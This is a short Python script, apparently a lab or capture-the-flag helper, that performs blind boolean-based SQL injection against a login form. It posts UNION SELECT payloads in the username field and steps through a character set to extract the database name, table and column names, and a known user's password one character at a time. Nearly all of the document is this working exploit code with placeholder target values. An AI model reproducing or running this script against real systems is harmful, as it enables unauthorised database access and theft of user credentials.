"""
This script will enumerate a vulnerable target to identify database, table and column names.

The "charset" value can be modified to any string you choose and the script will enumerate through it.

This is going to be a heavy README.md file for now, I think this can be easily improved upon.
"""
import requests
import sys

def dataname(url):
    charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'
    
    ##Define length of charset, set i to 0 and set char to blank by default.
    length = len(charset)
    i = 0
    char = ""

    while i < length:
        #Data taken from curl request to target website. Username replaced with SQL commands. View README.md for more info on extracting data{} from curl.
        data = {
            #ENUMERATE DATABASE NAME:
            #'username':"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '" + char + charset[i] + "%' -- -",

            #ENUMERATE TABLE NAME:
            #'username':"' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = 'DISCOVERED_DATABASE_NAME' AND table_name LIKE BINARY '" + char + charset[i] + "%' -- -",

            #ENUMERATE COLUMN NAME:
            #'username':"' UNION SELECT 1,2,3,4 FROM information_schema.columns WHERE table_schema='DISCOVERED_DATABASE_NAME' AND table_name='DISCOVERED_TABLE_NAME' AND column_name LIKE BINARY '" + char + charset[i] + "%' -- -",
            
            #FETCH PASSWORD FOR DEFINED USER:
            #'username':"' UNION SELECT 1,2,3,4 FROM DISCOVERED_TABLE_NAME WHERE DISCOVERED_COLUMN_NAME LIKE BINARY 'KNOWN_USERNAME' AND password LIKE BINARY '" + char + charset[i] + "%' -- -",
            'password':'a'
        }
        #Make post request to the URL with provided data.
        req = requests.post(url,data=data)

        #If login is successful, then accept the first char and start again.
        if "SUCCESS_INDICATOR_TEXT" in req.text:
            char = char + charset[i]
            i = 0
        #If login is unsuccessful, keep going through the list. 
        else:
            sys.stdout.write(f"\rExtracting: {char}{charset[i]}")
            sys.stdout.flush()
            i += 1

if __name__== "__main__":
   url = "TARGET_URL"
   dataname(url)